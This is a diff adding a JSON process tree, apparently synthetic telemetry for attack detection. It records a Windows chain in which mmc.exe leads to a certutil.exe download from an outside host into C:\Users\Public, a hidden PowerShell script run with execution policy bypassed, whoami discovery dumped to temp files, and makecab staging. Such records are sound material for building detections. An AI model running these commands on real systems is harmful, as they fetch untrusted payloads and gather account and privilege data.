@@ -1,0 +1,173 @@
+{
+  "pid": 200733,
+  "ppid": 0,
+  "name": "mmc.exe",
+  "command": "mmc.exe /silent",
+  "children": [
+    {
+      "pid": 200740,
+      "ppid": 200733,
+      "name": "choice.exe",
+      "command": "choice.exe /d y /t 14 > nul",
+      "children": [
+        {
+          "pid": 200744,
+          "ppid": 200740,
+          "name": "certutil.exe",
+          "command": "certutil.exe -urlcache -split -f \"http://cdn.contoso-updates.com/certs/workstation.cer\" \"C:\\Users\\Public\\relay.bin\"",
+          "children": [
+            {
+              "pid": 200750,
+              "ppid": 200744,
+              "name": "choice.exe",
+              "command": "choice.exe /d y /t 5 > nul",
+              "children": [
+                {
+                  "pid": 200756,
+                  "ppid": 200750,
+                  "name": "powershell.exe",
+                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\\IT\\Tools\\TrustRefresh_be013163.ps1\" -Host \"ENG-146\" -Mode Verify",
+                  "children": [
+                    {
+                      "pid": 200763,
+                      "ppid": 200756,
+                      "name": "hostname.exe",
+                      "command": "hostname.exe",
+                      "children": [
+                        {
+                          "pid": 200769,
+                          "ppid": 200763,
+                          "name": "powershell.exe",
+                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'timeout.exe' -ArgumentList '/t 10 /nobreak' -Wait\"",
+                          "children": [
+                            {
+                              "pid": 200772,
+                              "ppid": 200769,
+                              "name": "hostname.exe",
+                              "command": "hostname.exe",
+                              "children": [
+                                {
+                                  "pid": 200777,
+                                  "ppid": 200772,
+                                  "name": "ping.exe",
+                                  "command": "ping.exe -n 3 127.0.0.1 > nul",
+                                  "children": [
+                                    {
+                                      "pid": 200780,
+                                      "ppid": 200777,
+                                      "name": "hostname.exe",
+                                      "command": "hostname.exe",
+                                      "children": [
+                                        {
+                                          "pid": 200783,
+                                          "ppid": 200780,
+                                          "name": "whoami.exe",
+                                          "command": "whoami.exe /all",
+                                          "children": [
+                                            {
+                                              "pid": 200785,
+                                              "ppid": 200783,
+                                              "name": "powershell.exe",
+                                              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 10\"",
+                                              "children": []
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                },
+                                {
+                                  "pid": 200792,
+                                  "ppid": 200772,
+                                  "name": "findstr.exe",
+                                  "command": "findstr.exe /i \"task\" \"C:\\ProgramData\\Contoso\\Logs\\support.log\"",
+                                  "children": [
+                                    {
+                                      "pid": 200798,
+                                      "ppid": 200792,
+                                      "name": "hostname.exe",
+                                      "command": "hostname.exe > \"C:\\Users\\varun.patel\\AppData\\Local\\Temp\\host_c2337d2e.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 200801,
+                                          "ppid": 200798,
+                                          "name": "whoami.exe",
+                                          "command": "whoami.exe /groups > \"C:\\Users\\varun.patel\\AppData\\Local\\Temp\\who_c91779c1.txt\"",
+                                          "children": [
+                                            {
+                                              "pid": 200802,
+                                              "ppid": 200801,
+                                              "name": "hostname.exe",
+                                              "command": "hostname.exe > \"C:\\Users\\varun.patel\\AppData\\Local\\Temp\\host_b26e0f0a.txt\"",
+                                              "children": [
+                                                {
+                                                  "pid": 200804,
+                                                  "ppid": 200802,
+                                                  "name": "hostname.exe",
+                                                  "command": "hostname.exe",
+                                                  "children": []
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    },
+                                    {
+                                      "pid": 200808,
+                                      "ppid": 200792,
+                                      "name": "hostname.exe",
+                                      "command": "hostname.exe > \"C:\\Users\\varun.patel\\AppData\\Local\\Temp\\host_9bea6306.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 200811,
+                                          "ppid": 200808,
+                                          "name": "makecab.exe",
+                                          "command": "makecab.exe \"C:\\Users\\varun.patel\\AppData\\Local\\Temp\\trace.etl\" \"C:\\Users\\varun.patel\\AppData\\Local\\Temp\\trace.cab\"",
+                                          "children": [
+                                            {
+                                              "pid": 200814,
+                                              "ppid": 200811,
+                                              "name": "whoami.exe",
+                                              "command": "whoami.exe /priv > \"C:\\Users\\varun.patel\\AppData\\Local\\Temp\\who_48689eb3.txt\"",
+                                              "children": [
+                                                {
+                                                  "pid": 200820,
+                                                  "ppid": 200814,
+                                                  "name": "hostname.exe",
+                                                  "command": "hostname.exe",
+                                                  "children": [
+                                                    {
+                                                      "pid": 200825,
+                                                      "ppid": 200820,
+                                                      "name": "hostname.exe",
+                                                      "command": "hostname.exe",
+                                                      "children": []
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
